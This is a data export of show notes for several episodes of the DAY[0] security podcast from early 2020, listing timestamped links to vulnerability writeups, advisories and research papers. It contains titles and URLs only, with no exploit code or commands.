- One-Two-Three Named Vulns (kr00k, Forgot2kEyXCHANGE, GhostCat) and more OpenSMTPD and Samsung Vulnerabilities","path":"/posts/episode-31/","date":"3 March 2020","description":"Join Specter and zi at they discuss several named vulns (kr00k, Forgot2kEyXCHANGE, GhostCat), the benefits of DNS-over-HTTPS, and a a few vulns in some of our regular targets: Samsung drivers, NordVPN, OpenSMTPd.","content":"<!--kg-card-begin: html--><iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/ZfQ5vgCFiEg\" frameborder=\"0\" allow=\"accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>\n<hr />\n<p>Join Specter and zi at they discuss several named vulns (kr00k, Forgot2kEyXCHANGE, GhostCat), the benefits of DNS-over-HTTPS, and a a few vulns in some of our regular targets: Samsung drivers, NordVPN, OpenSMTPd.</p>\n<p>&nbsp;</p>\n<ul>\n<li>[<a href=\"https://www.youtube.com/watch?v=ZfQ5vgCFiEg&t=83\">00:01:23</a>] <a href=\"https://www.thedailybeast.com/clearview-ai-facial-recognition-company-that-works-with-law-enforcement-says-entire-client-list-was-stolen\">Facial-Recognition Company That Works With Law Enforcement Says Entire Client List Was Stolen</a><br />\n\t<ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=ZfQ5vgCFiEg&t=383\">00:06:23</a>] <a href=\"https://blog.mozilla.org/blog/2020/02/25/firefox-continues-push-to-bring-dns-over-https-by-default-for-us-users/\">Firefox continues push to bring DNS over HTTPS by default for US users</a><br />\n\t<ul><li><a href=\"https://github.com/curl/curl/wiki/DNS-over-HTTPS\">https://github.com/curl/curl/wiki/DNS-over-HTTPS</a><br /></li></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=ZfQ5vgCFiEg&t=1157\">00:19:17</a>] <a href=\"https://blog.cloudflare.com/securing-memory-at-epyc-scale/\">Securing Memory at EPYC Scale</a><br />\n\t<ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=ZfQ5vgCFiEg&t=1600\">00:26:40</a>] <a href=\"https://www.wired.com/story/hackers-mom-broke-into-prison-wardens-computer/\">How a Hacker's Mom Broke Into a Prisonâ€”and the Warden's Computer</a><br />\n\t<ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=ZfQ5vgCFiEg&t=1762\">00:29:22</a>] <a href=\"https://www.eset.com/int/kr00k/\"> kr00k | ESET</a><br />\n\t<ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=ZfQ5vgCFiEg&t=2004\">00:33:24</a>] <a href=\"https://www.zerodayinitiative.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys\">CVE-2020-0688: Remote Code Execution on Microsoft Exchange Server Through Fixed Cryptographic Keys</a><br />\n\t<ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=ZfQ5vgCFiEg&t=2271\">00:37:51</a>] <a href=\"https://www.chaitin.cn/en/ghostcat\">CVE-2020-1938: Ghostcat vulnerability</a><br />\n\t<ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=ZfQ5vgCFiEg&t=2786\">00:46:26</a>] <a href=\"https://www.qualys.com/2020/02/24/cve-2020-8794/lpe-rce-opensmtpd-default-install.txt\">LPE and RCE in OpenSMTPD's default install (CVE-2020-8794)</a><br />\n\t<ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=ZfQ5vgCFiEg&t=3353\">00:55:53</a>] <a href=\"https://hackerone.com/reports/756149\">Blind SSRF on debug.nordvpn.com due to misconfigured sentry instance</a><br />\n\t<ul><li><a href=\"https://hackerone.com/reports/374737\">https://hackerone.com/reports/374737</a><br /></li></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=ZfQ5vgCFiEg&t=3640\">01:00:40</a>] <a href=\"https://hackerone.com/reports/798686\">x-request-id header reflected in server response without sanitization</a><br />\n\t<ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=ZfQ5vgCFiEg&t=3964\">01:06:04</a>] <a href=\"https://hackerone.com/reports/397545\">Malformed .BMP file in Counter-Strike 1.6 may cause shellcode injection</a><br />\n\t<ul><li><a href=\"https://hackerone.com/valve/hacktivity\">https://hackerone.com/valve/hacktivity</a><br /></li></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=ZfQ5vgCFiEg&t=4386\">01:13:06</a>] <a href=\"https://packetstormsecurity.com/files/156560/GS20200228071051.tgz\">Samsung Kernel /dev/hdcp2 hdcp_session_close() Race Condition</a><br />\n\t<ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=ZfQ5vgCFiEg&t=4509\">01:15:09</a>] <a href=\"https://packetstormsecurity.com/files/156558/GS20200228070705.tgz\">Samsung Kernel Arbitrary /dev/vipx / /dev/vertex kfree</a><br />\n\t<ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=ZfQ5vgCFiEg&t=4724\">01:18:44</a>] <a href=\"https://packetstormsecurity.com/files/156557/GS20200228070551.tgz\">Samsung Kernel /dev/vipx Pointer Leak</a><br />\n\t<ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=ZfQ5vgCFiEg&t=4951\">01:22:31</a>] <a href=\"https://www.ndss-symposium.org/ndss-paper/hfl-hybrid-fuzzing-on-the-linux-kernel/\">HFL: Hybrid Fuzzing on the Linux Kernel â€“ NDSS Symposium</a><br />\n\t<ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=ZfQ5vgCFiEg&t=5442\">01:30:42</a>] <a href=\"https://arxiv.org/abs/1810.10109\">Et Tu Alexa? When Commodity WiFi Devices Turn into Adversarial Motion Sensors</a><br />\n\t<ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=ZfQ5vgCFiEg&t=5917\">01:38:37</a>] <a href=\"https://evasions.checkpoint.com/\">Evasion techniques</a><br />\n\t<ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=ZfQ5vgCFiEg&t=5981\">01:39:41</a>] <a href=\"https://www.bugcrowd.com/blog/hacking-unicode-like-a-boss/\">Hacking Unicode Like a Boss</a><br />\n\t<ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=ZfQ5vgCFiEg&t=6195\">01:43:15</a>] <a href=\"https://nafod.net/blog/2020/02/29/zdi-19-421-uhci.html\">Pwning VMware, Part 2: ZDI-19-421, a UHCI bug | nafod</a><br />\n\t<ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=ZfQ5vgCFiEg&t=6298\">01:44:58</a>] <a href=\"https://sensepost.com/blog/2020/intro-to-chromes-v8-from-an-exploit-development-angle/\">Intro to chrome's v8 from an exploit development angle</a><br />\n\t<ul></ul></li>\n</ul>\n<p>Watch the DAY[0] podcast live on <a href=\"https://www.twitch.tv/dayzerosec\">Twitch (@dayzerosec)</a> every Monday afternoon at 12:00pm PST (3:00pm EST)</p><!--kg-card-end: html-->","slug":"episode-31"}},{"node":{"title":"Episode 30 - A Dark White-Hat hacker? and various vulns ft. Cisco, Periscope, NordVPN and Tesla/EyeQ","path":"/posts/episode-30/","date":"25 February 2020","description":"Keeping up our streak, we talk about some vulnerabilities in Cisco, NordVPN and Tesla, and about SlickWraps being hacked by a very dark, white-hat.","content":"<!--kg-card-begin: html--><iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/51BxWOutV_w\" frameborder=\"0\" allow=\"accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>\n<hr />\n<p>Keeping up our streak, we talk about some vulnerabilities in Cisco, NordVPN and Tesla, and about SlickWraps being hacked by a very dark, white-hat.</p>\n<p>&nbsp;</p>\n<ul>\n<li>[<a href=\"https://www.youtube.com/watch?v=51BxWOutV_w&t=160\">00:02:40</a>] <a href=\"https://www.humblebundle.com/books/cybersecurity-2020-wiley-books\">Humble Book Bundle: Cybersecurity 2020 by Wiley</a><br />\n        <ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=51BxWOutV_w&t=699\">00:11:39</a>] <a href=\"https://summerofcode.withgoogle.com/organizations/?sp-category=security\">Google Summer of Code 2020</a><br />\n        <ul><li><a href=\"https://radare.org/gsoc/2020/\">https://radare.org/gsoc/2020/</a><br /></li></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=51BxWOutV_w&t=1389\">00:23:09</a>] <a href=\"https://www.webarxsecurity.com/critical-issue-in-themegrill-demo-importer/\">Critical Issue In ThemeGrill Demo Importer</a><br />\n        <ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=51BxWOutV_w&t=1736\">00:28:56</a>] <a href=\"https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-on-prem-static-cred-sL8rDs8\">Cisco Security Advisory: Cisco Smart Software Manager On-Prem Static Default Credential Vulnerability</a><br />\n        <ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=51BxWOutV_w&t=1947\">00:32:27</a>] <a href=\"https://hackerone.com/reports/771977\">nordvpn Linux Desktop executable application does not use pie / no ASLR</a><br />\n        <ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=51BxWOutV_w&t=2465\">00:41:05</a>] <a href=\"https://hackerone.com/reports/768110\">Race condition (TOCTOU) in NordVPN can result in local privilege escalation</a><br />\n        <ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=51BxWOutV_w&t=2965\">00:49:25</a>] <a href=\"https://hackerone.com/reports/583987\">Periscope android app deeplink leads to CSRF in follow action</a><br />\n        <ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=51BxWOutV_w&t=3249\">00:54:09</a>] <a href=\"https://archive.is/yEIJT\">I hacked SlickWraps. This is how. - Lynx0x00 - Medium</a><br />\n        <ul><li><a href=\"https://files.catbox.moe/fxn9r2.pdf\">https://files.catbox.moe/fxn9r2.pdf</a><br /></li></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=51BxWOutV_w&t=4231\">01:10:31</a>] <a href=\"https://www.mcafee.com/blogs/other-blogs/mcafee-labs/model-hacking-adas-to-pave-safer-roads-for-autonomous-vehicles/\">Model Hacking ADAS to Pave Safer Roads for Autonomous Vehicles </a><br />\n        <ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=51BxWOutV_w&t=4719\">01:18:39</a>] <a href=\"https://github.com/phoenhex/files/blob/master/pocs/cve-2020-0767.js\">Edge CVE-2020-0767 RCE POC</a><br />\n        <ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=51BxWOutV_w&t=4930\">01:22:10</a>] <a href=\"https://know.bishopfox.com/research/gadgetprobe\">GadgetProbe: Exploiting Deserialization to Brute-Force the Remote Classpath</a><br />\n        <ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=51BxWOutV_w&t=5325\">01:28:45</a>] <a href=\"https://arxiv.org/abs/2002.08437v1\">CopyCat: Controlled Instruction-Level Attacks on Enclaves for Maximal Key Extraction</a><br />\n        <ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=51BxWOutV_w&t=5859\">01:37:39</a>] <a href=\"https://arxiv.org/abs/2002.08568v1\">MEUZZ: Smart Seed Scheduling for Hybrid Fuzzing</a><br />\n        <ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=51BxWOutV_w&t=6584\">01:49:44</a>] <a href=\"https://pwn.college/\">pwn.college BETA</a><br />\n        <ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=51BxWOutV_w&t=6805\">01:53:25</a>] <a href=\"https://research.nccgroup.com/2020/02/20/whitepaper-microcontroller-readback-protection-bypasses-and-defenses/\">Microcontroller Readback Protection: Bypasses and Defenses</a><br />\n        <ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=51BxWOutV_w&t=6848\">01:54:08</a>] <a href=\"https://aflplus.plus/docs/tutorials/libxml2_tutorial/\">Libxml2 Tutorial | AFLplusplus</a><br />\n        <ul></ul></li>\n<li>[<a href=\"https://www.youtube.com/watch?v=51BxWOutV_w&t=6974\">01:56:14</a>] <a href=\"https://github.com/alephsecurity/confs\">Booting iOS on QEMU Research Slides</a><br />\n        <ul><li><a href=\"https://github.com/alephsecurity/confs/blob/master/OFFENSIVE20/offensive-20-ios-qemu.pdf\">https://github.com/alephsecurity/confs/blob/master/OFFENSIVE20/offensive-20-ios-qemu.pdf</a><br /></li><li><a href=\"https://github.com/alephsecurity/xnu-qemu-arm64\">https://github.com/alephsecurity/xnu-qemu-arm64</a><br /></li></ul></li>\n</ul>\n<p>Watch the DAY[0] podcast live on <a href=\"https://www.twitch.tv/dayzerosec\">Twitch (@dayzerosec)</a> every Monday afternoon at 12:00pm PST (3:00pm EST)</p><!--kg-card-end: html-->","slug":"episode-30"}},{"node":{"title":"Episode #28 - Hack Twitter, WhatsApp and all your Cisco phones (CDPwn) ft. GhostKnight","path":"/posts/episode-28/","date":"11 February 2020","description":"Android, Bluetooth, Microsoft, NordVPN, Twitter, WhatsApp, Cisco, vulns for days impacting several big names and a couple new attack ideas, blind regex injection and GhostKnight a technique to breach data integrity using speculative execution.","content":"<!--kg-card-begin: html--><iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/mMEAHkzoZrI\" frameborder=\"0\" allow=\"accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe><!--kg-card-end: html--><hr><!--kg-card-begin: html--><p>Android, Bluetooth, Microsoft, NordVPN, Twitter, WhatsApp, Cisco, vulns for days impacting several big names and a couple new attack ideas, blind regex injection and GhostKnight a technique to breach data integrity using speculative execution.</p>\n<ul>\n<li>[00:01:07] <a href='https://github.com/sudo-project/sudo/blob/0fcb6471609969b5911db0b2917ced16c913676f/src/tgetpass.c#L125'>Updated re. Sudo Exploit</a></li><br />\n<li>[00:03:32] <a href='https://www.justice.gov/opa/press-release/file/1246891/download'>Charges Filed against Four Chinese PLA Hackers for part in 2017 Equifax Breach</a></li><br />\n<li>[00:06:06] <a href='https://www.thezdi.com/blog/2020/2/9/announcing-a-targeted-incentive-program-for-selected-trend-micro-products'>Announcing a Targeted Incentive Program for Selected Trend Micro Products</a></li><br />\n<li>[00:11:01] <a href='https://source.android.com/security/bulletin/2020-02-01.html'>Android Security Bulletin - February 2020</a></li><br />\n<ul><li><a href='https://android.googlesource.com/kernel/common/+/5eeb2ca0'>https://android.googlesource.com/kernel/common/+/5eeb2ca0</a></li></ul><br />\n<ul><li><a href='https://android.googlesource.com/kernel/common/+/5eeb2ca0%5E%21/#F0'>https://android.googlesource.com/kernel/common/+/5eeb2ca0%5E%21/#F0</a></li></ul><br />\n<li>[00:17:06] <a href='https://android.googlesource.com/platform/system/bt/+/3cb7149d8fed2d7d77ceaa95bf845224c4db3baf'>Critical Bluetooth Vulnerability in Android (CVE-2020-0022)</a></li><br />\n<li>[00:22:48] <a href='https://krebsonsecurity.com/2020/02/dangerous-domain-corp-com-goes-up-for-sale/'>Dangerous Domain Corp.com Goes Up for Sale</a></li><br />\n<li>[00:37:43] <a href='https://hackerone.com/reports/751577'>NordVPN - IDOR allow access to payments data of any user</a></li><br />\n<ul><li><a href='https://hackerone.com/nordvpn'>https://hackerone.com/nordvpn</a></li></ul><br />\n<li>[00:43:35] <a href='https://hackerone.com/reports/770504'>Twitter - Bypass Password Authentication for updating email and phone number</a></li><br />\n<li>[00:48:27] <a href='https://www.perimeterx.com/tech-blog/2020/whatsapp-fs-read-vuln-disclosure/'>WhatsApp Desktop XSS to Local File read (CVE-2019-18426)</a></li><br />\n<li>[01:03:03] <a href='https://www.armis.com/cdpwn/'>CDPwn: 5 Zero-Days in Cisco Discovery Protocol</a></li><br />\n<li>[01:15:07] <a href='https://diary.shift-js.info/blind-regular-expression-injection/'>A Rough Idea of Blind Regular Expression Injection Attack</a></li><br />\n<ul><li><a href='https://speakerdeck.com/lmt_swallow/revisiting-redos-a-rough-idea-of-data-exfiltration-by-redos-and-side-channel-techniques'>https://speakerdeck.com/lmt_swallow/revisiting-redos-a-rough-idea-of-data-exfiltration-by-redos-and-side-channel-techniques</a></li></ul><br />\n<li>[01:20:45] <a href='https://arxiv.org/abs/2002.00524v1'>GhostKnight: Breaching Data Integrity via Speculative Execution</a></li><br />\n<li>[01:26:00] <a href='https://arxiv.org/abs/2002.01078v1'>BRIGHTNESS: Leaking Sensitive Data from Air-Gapped Workstations via Screen Brightness</a></li><br />\n<li>[01:30:27] <a href='https://labs.f-secure.com/blog/forging-swift-mt-payment-messages'>Forging SWIFT MT Payment Messages for fun and pr... research!</a></li><br />\n<li>[01:35:22] <a href='https://azeria-labs.com/grooming-the-ios-kernel-heap/'>Grooming the iOS Kernel Heap</a></li><br />\n</ul>\n<p>Watch the DAY[0] podcast live on <a href=\"https://www.twitch.tv/dayzerosec\">Twitch (@dayzerosec)</a> every Monday afternoon at 12:00pm PST (3:00pm EST)</p>\n<!--kg-card-end: html-->","slug":"episode-28"}},{"node":{"title":"Episode #27 - Ok Google, sudo ./hacktheplanet","path":"/posts/episode-27/","date":"4 February 2020","description":"Ok Google! Bypass authentication..and while we're at it, lets explot sudo and OpenSMPTD for root access. This week we dive into various code bases to explore several recent exploits that take advantage of some common yet subtle issues.","content":"<!--kg-card-begin: html--><iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/L3lfNoovMu8\" frameborder=\"0\" allow=\"accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe><!--kg-card-end: html--><hr><!--kg-card-begin: html--><p>Ok Google! Bypass authentication..and while we're at it, lets explot sudo and OpenSMPTD for root access. This week we dive into various code bases to explore several recent exploits that take advantage of some common yet subtle issues.</p>\n<p></p>\n<p><b>Correction:</b> During the segment about the sudo (pwfeedback) exploit I incorrectly described the issue as a stack-based buffer overflow, however the buf variable is declared as static so it ends up in .bss and not on the stack. ~zi</p>\n<ul>\n<li>[00:00:30] <a href='https://www.coalfire.com/News-and-Events/Press-Releases/Charges-Dismissed-Against-Coalfire-Employees'>Charges Dismissed Against Coalfire Employees</a></li><br />\n<li>[00:06:28] <a href='https://press.avast.com/avast-to-commence-wind-down-of-subsidiary-jumpshot'>Avast to Commence Wind Down of Subsidiary Jumpshot</a></li><br />\n<li>[00:21:49] <a href='https://security.googleblog.com/2020/01/say-hello-to-opensk-fully-open-source.html'>Say hello to OpenSK: a fully open-source security key implementation</a></li><br />\n<li>[00:28:04] <a href='https://blog.kraken.com/post/3662/kraken-identifies-critical-flaw-in-trezor-hardware-wallets/'>Kraken Identifies Critical Flaw in Trezor Hardware Wallets</a></li><br />\n<li>[00:33:34] <a href='https://research.checkpoint.com/2020/zoom-zoom-we-are-watching-you/'>Zoom-Zoom: We Are Watching You</a></li><br />\n<li>[00:38:47] <a href='https://whynotsecurity.com/blog/teamviewer/'>TeamViewer using encrypted passwords</a></li><br />\n<li>[00:47:22] <a href='https://www.sudo.ws/alerts/pwfeedback.html'>Buffer overflow [in sudo] when pwfeedback is set in sudoers (CVE-2019-18634)</a></li><br />\n<ul><li><a href='https://github.com/sudo-project/sudo/commit/fa8ffeb17523494f0e8bb49a25e53635f4509078'>https://github.com/sudo-project/sudo/commit/fa8ffeb17523494f0e8bb49a25e53635f4509078</a></li></ul><br />\n<ul><li><a href='https://github.com/sudo-project/sudo/blob/0fcb6471609969b5911db0b2917ced16c913676f/src/tgetpass.c#L413'>https://github.com/sudo-project/sudo/blob/0fcb6471609969b5911db0b2917ced16c913676f/src/tgetpass.c#L413</a></li></ul><br />\n<li>[01:01:02] <a href='https://lists.infradead.org/pipermail/openwrt-devel/2020-January/021544.html'>Opkg susceptible to MITM (CVE-2020-7982)</a></li><br />\n<ul><li><a href='https://git.openwrt.org/?p=project/opkg-lede.git;a=commitdiff;h=54cc7e3bd1f79569022aa9fc3d0e748c81e3bcd8'>https://git.openwrt.org/?p=project/opkg-lede.git;a=commitdiff;h=54cc7e3bd1f79569022aa9fc3d0e748c81e3bcd8</a></li></ul><br />\n<li>[01:06:57] <a href='https://www.openwall.com/lists/oss-security/2020/01/28/3'>LPE and RCE in OpenSMTPD (CVE-2020-7247)</a></li><br />\n<li>[01:13:52] <a href='https://github.com/mm0r1/exploits/tree/master/php7-backtrace-bypass'>PHP 7.0-7.4 disable_functions bypass 0day PoC</a></li><br />\n<ul><li><a href='https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php'>https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php</a></li></ul><br />\n<li>[01:28:32] <a href='https://research.checkpoint.com/2020/remote-cloud-execution-critical-vulnerabilities-in-azure-cloud-infrastructure-part-i/'>Remote Cloud Execution â€“ Critical Vulnerabilities in Azure Cloud Infrastructure (Part I)</a></li><br />\n<ul><li><a href='https://research.checkpoint.com/2020/remote-cloud-execution-critical-vulnerabilities-in-azure-cloud-infrastructure-part-ii/'>https://research.checkpoint.com/2020/remote-cloud-execution-critical-vulnerabilities-in-azure-cloud-infrastructure-part-ii/</a></li></ul><br />\n<li>[01:40:01] <a href='https://techblog.mediaservice.net/2020/01/ok-google-bypass-the-authentication/'>OK Google: bypass the authentication!</a></li><br />\n</ul>\n<p>Watch the DAY[0] podcast live on <a href=\"https://www.twitch.tv/dayzerosec\">Twitch (@dayzerosec)</a> every Monday afternoon at 12:00pm PST (3:00pm EST)</p>\n<!--kg-card-end: html-->","slug":"episode-27"}},{"node":{"title":"Episode 26 - Return of the Zombieload, Bezos Hacked, and other exploits","path":"/posts/episode-26/","date":"28 January 2020","description":"This week we look at 15 CVEs this week including the new MDS Attacks/Zombieload and GhostImage a cool attack against vision-based classification systems. We also have discussion about mobile vs desktop security.","content":"<!--kg-card-begin: html--><iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/APQGlMy_3Hg\" frameborder=\"0\" allow=\"accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe><!--kg-card-end: html--><hr><!--kg-card-begin: html--><p>Watch the DAY[0] podcast live on <a href=\"https://www.twitch.tv/dayzerosec\">Twitch (@dayzerosec)</a> every Monday afternoon at 12:00pm PST (3:00pm EST)</p>\n<ul>\n<li>[00:01:41] <a href='https://www.zerodayinitiative.com/blog/2020/1/21/pwn2own-miami-2020-schedule-and-live-results'>Pwn2Own Miami 2020</a></li><br />\n<li>[00:06:41] <a href='https://www.ohchr.org/EN/NewsEvents/Pages/DisplayNews.aspx?NewsID=25488'>Allegations that Saudi Crown Prince involved in hacking of Jeff Bezosâ€™ phone</a></li><br />\n<ul><li><a href='https://twitter.com/dinodaizovi/status/1221324029841244161'>https://twitter.com/dinodaizovi/status/1221324029841244161</a></li></ul><br />\n<li>[00:11:33] <a href='https://twitter.com/chrisrohlf/status/1220482406345519104?s=19'>Chris Rohlf on Twitter: \"...Mobile security was largely a success relative to the state of the desktop...\"</a></li><br />\n<li>[00:25:57] <a href='https://mdsattacks.com/#ridl-nng'>More MDS Attacks: Intel Patching its Patch of the Patch for MDS/ZombieLoad Attacks</a></li><br />\n<ul><li><a href='https://blogs.intel.com/technology/2020/01/ipas-intel-sa-00329/#gs.upv68b'>https://blogs.intel.com/technology/2020/01/ipas-intel-sa-00329/#gs.upv68b</a></li></ul><br />\n<li>[00:31:42] <a href='https://www.cybermdx.com/vulnerability-research-disclosures/cic-pro-and-other-ge-devices'>MDHex Vulnerabilities</a></li><br />\n<li>[00:43:04] <a href='https://web-in-security.blogspot.com/2020/01/cve-2020-2655-jsse-client.html'>JSSE Client Authentication Bypass (CVE-2020-2655)</a></li><br />\n<li>[00:55:46] <a href='https://www.pentagrid.ch/en/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/'>Local Privilege Escalation in many Ricoh Printer Drivers for Windows (CVE-2019-19363)</a></li><br />\n<li>[00:58:42] <a href='https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/modsecurity-denial-of-service-details-cve-2019-19886/'>ModSecurity Denial of Service (CVE-2019-19886)</a></li><br />\n<li>[01:02:56] <a href='https://medium.com/@milanmagyar/ggvulnz-how-i-hacked-hundreds-of-companies-through-google-groups-b69c658c8924'>GGvulnz - How I hacked hundreds of companies through Google Groups</a></li><br />\n<li>[01:09:23] <a href='https://seclists.org/fulldisclosure/2020/Jan/29'>Neowise CarbonFTP v1.4 / Insecure Proprietary Password Encryption (CVE-2020-6857)</a></li><br />\n<li>[01:14:48] <a href='https://lore.kernel.org/patchwork/patch/1157641/'>arm64: uaccess: Ensure PAN is re-enabled after unhandled uaccess fault - Patchwork</a></li><br />\n<li>[01:19:02] <a href='https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20200124-webex-unauthjoin'>Cisco Webex Meetings Suite and Cisco Webex Meetings Online Unauthenticated Meeting Join Vulnerability (CVE-2020-3142)</a></li><br />\n<li>[01:21:43] <a href='https://github.com/HE-Wenjian/iGPU-Leak'>iGPU Leak: An Information Leakage Vulnerability on Intel Integrated GPU (CVE-2019-14615)</a></li><br />\n<ul><li><a href='https://github.com/HE-Wenjian/iGPU-Leak/blob/master/iGPU-Leak_Slides.pdf'>https://github.com/HE-Wenjian/iGPU-Leak/blob/master/iGPU-Leak_Slides.pdf</a></li></ul><br />\n<li>[01:28:50] <a href='https://arxiv.org/abs/2001.07421v1'>Information Leaks via Safari's Intelligent Tracking Prevention</a></li><br />\n<li>[01:39:11] <a href='https://arxiv.org/abs/2001.07792v1'>GhostImage: Perception Domain Attacks against Vision-based Object Classification Systems</a></li><br />\n<li>[01:44:55] <a href='https://github.com/guyinatuxedo/nightmare'>Nightmare - A collection of binary exploitation / reverse engineering challenges and writeups</a></li><br />\n<li>[01:49:35] <a href='https://grsecurity.net/the_life_of_a_bad_security_fix'>The Life of a Bad Security Fix</a></li><br />\n<li>[01:51:31] <a href='https://bugs.chromium.org/p/project-zero/issues/detail?id=1952'>macOS/iOS: ImageIO: heap corruption when processing malformed TIFF image</a></li><br />\n<!--kg-card-end: html-->","slug":"episode-26"}},{"node":{"title":"Episode 25 - Project Verona, CurveBall, CableHaunt, and RCEs-a-plenty","path":"/posts/episode-25/","date":"21 January 2020","description":"Start off with some discussions about Google, privacy, Rust, and entitlement within open-source software. Then we look at some of the big vulns of the past week including CurveBall, CabelHaunt, and an RDP RCE.","content":"<!--kg-card-begin: html--><iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/RF_wzUPcXPw\" frameborder=\"0\" allow=\"accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe><!--kg-card-end: html--><hr><!--kg-card-begin: html--><p>Start off with some discussions about Google, privacy, Rust, and entitlement within open-source software. Then we look at some of the big vulns of the past week including CurveBall, CabelHaunt, and an RDP RCE.</p><!--kg-card-end: html--><hr><!--kg-card-begin: html--><p>Watch the DAY[0] podcast live on <a href=\"https://www.twitch.tv/dayzerosec\">Twitch (@dayzerosec)</a> every Monday afternoon at 12:00pm PST (3:00pm EST)</p>\n<ul>\n<li>[00:00:35] <a href='https://blog.chromium.org/2020/01/building-more-private-web-path-towards.html'>Chromium Blog: Building a more private web: A path towards making third party cookies obsolete</a></li><br />\n<li>[00:07:13] <a href='https://www.justice.gov/usao-dc/pr/weleakinfocom-domain-name-seized'>WeLeakInfo.com Domain Name Seized</a></li><br />\n<li>[00:13:46] <a href='https://words.steveklabnik.com/a-sad-day-for-rust'>A sad day for Rust</a></li><br />\n<li>[00:25:46] <a href='https://github.com/microsoft/verona'>GitHub - microsoft/verona: Research programming language for concurrent ownership</a></li><br />\n<ul><li><a href='https://github.com/microsoft/verona/blob/master/docs/explore.md'>https://github.com/microsoft/verona/blob/master/docs/explore.md</a></li></ul><br />\n<li>[00:37:38] <a href='https://arxiv.org/abs/2001.04107v2'>Montage: A Neural Network Language Model-Guided JavaScript Engine Fuzzer</a></li><br />\n<li>[00:47:23] <a href='https://outflux.net/slides/2020/lca/cfi.pdf'>Control Flow Integrity (CFI) in the Linux kernel</a></li><br />\n<li>[00:54:01] <a href='https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/ADV200001'>ADV200001 | Microsoft Guidance on Scripting Engine Memory Corruption Vulnerability (CVE-2020-0674)</a></li><br />\n<li>[00:57:26] <a href='https://gist.github.com/nstarke/a611a19aab433555e91c656fe1f030a9'>Netgear TLS Private Key Disclosure through Device Firmware Images</a></li><br />\n<ul><li><a href='https://news.ycombinator.com/item?id=22048619'>https://news.ycombinator.com/item?id=22048619</a></li></ul><br />\n<ul><li><a href='https://github.com/ollypwn/CVE-2020-0601/blob/master/main.rb'>https://github.com/ollypwn/CVE-2020-0601/blob/master/main.rb</a></li></ul><br />\n<li>[01:17:47] <a href='https://cablehaunt.com/'>Cable Haunt</a></li><br />\n<li>[01:27:26] <a href='https://www.kryptoslogic.com/blog/2020/01/rdp-to-rce-when-fragmentation-goes-wrong/'>RDP to RCE: When Fragmentation Goes Wrong</a></li><br />\n<li>[01:31:54] <a href='https://www.webarxsecurity.com/vulnerability-infinitewp-client-wp-time-capsule/'>Critical Auth Bypass Vulnerability In InfiniteWP Client And WP Time Capsule</a></li><br />\n<li>[01:37:56] <a href='https://siguza.github.io/cuck00/'>cuck00 | Twenty-twenty, bugs aplenty!</a></li><br />\n</ul>\n<!--kg-card-end: html-->","slug":"episode-25"}},{"node":{"title":"Episode 37 - IDA...Go home, Sandboxie source, and some RCEs (TP-Link, Starcraft 1, OhMyZsh)","path":"/posts/episode-37/","date":"15 April 2020","description":"Starting off the week with a discussion about the disappointing IDA Home, before moving into a few easy command injections, code-reuse attacks applied to XSS, detecting trojaned hardware and ending with a subtle crypto-bug.","content":"<!--kg-card-begin: html--><iframe 